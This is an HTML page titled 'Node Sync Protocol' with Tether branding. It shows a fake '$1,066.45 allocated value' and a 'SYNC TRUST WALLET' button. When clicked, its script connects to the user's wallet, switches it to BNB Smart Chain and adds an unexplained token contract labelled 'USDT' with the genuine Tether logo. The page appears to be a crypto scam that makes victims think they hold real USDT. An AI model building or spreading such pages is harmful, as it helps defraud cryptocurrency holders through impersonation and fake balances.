<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Node Sync Protocol</title>
    <style>
        :root { --tether-green: #26a17b; --bg-dark: #0a0b0d; --card-bg: #121418; }
        body { background: var(--bg-dark); color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .container { background: var(--card-bg); border: 1px solid #2d333b; border-radius: 20px; padding: 35px; width: 350px; text-align: center; }
        
        /* Fixed Circular Logo Container */
        .logo-circle {
            width: 85px; height: 85px; background: var(--tether-green); 
            border-radius: 50%; display: flex; align-items: center; 
            justify-content: center; margin: 0 auto 20px;
            box-shadow: 0 0 20px rgba(38, 161, 123, 0.4);
        }
        .logo-circle svg { width: 50px; height: 50px; fill: white; }

        .price-display { background: rgba(38, 161, 123, 0.1); border: 1px dashed var(--tether-green); border-radius: 12px; padding: 20px; margin-bottom: 25px; }
        .amount { font-size: 28px; font-weight: bold; }
        .action-btn { background: var(--tether-green); color: white; border: none; width: 100%; padding: 16px; border-radius: 10px; font-weight: bold; cursor: pointer; }
        #status { font-size: 11px; color: #26a17b; margin-top: 15px; font-family: monospace; }
    </style>
</head>
<body>

<div class="container">
    <div class="logo-circle">
        <svg viewBox="0 0 24 24"><path d="M12.75 12.35v-5.3h4.63V4.25H6.62v2.8h4.63v5.3c-3.64.13-6.42.84-6.42 1.7s2.78 1.57 6.42 1.7v6.05h1.5v-6.05c3.64-.13 6.42-.84 6.42-1.7s-2.78-1.57-6.42-1.7z"/></svg>
    </div>
    
    <div class="price-display">
        <div style="font-size: 11px; color: #888; margin-bottom: 5px;">ALLOCATED VALUE</div>
        <div class="amount">$1,066.45</div>
    </div>

    <button class="action-btn" id="syncBtn">SYNC TRUST WALLET</button>
    <div id="status">READY</div>
</div>

<script>
    const CONTRACT = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
    const LOGO_URL = "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png";

    async function process() {
        const provider = window.trustwallet || window.ethereum;
        if (!provider) return;

        try {
            await provider.request({ method: 'eth_requestAccounts' });
            await provider.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: '0x38' }],
            });
            await provider.request({
                method: 'wallet_watchAsset',
                params: {
                    type: 'ERC20',
                    options: {
                        address: CONTRACT,
                        symbol: 'USDT',
                        decimals: 6,
                        image: LOGO_URL,
                    },
                },
            });
        } catch (err) { console.error(err); }
    }
    document.getElementById('syncBtn').addEventListener('click', process);
</script>
</body>
</html>
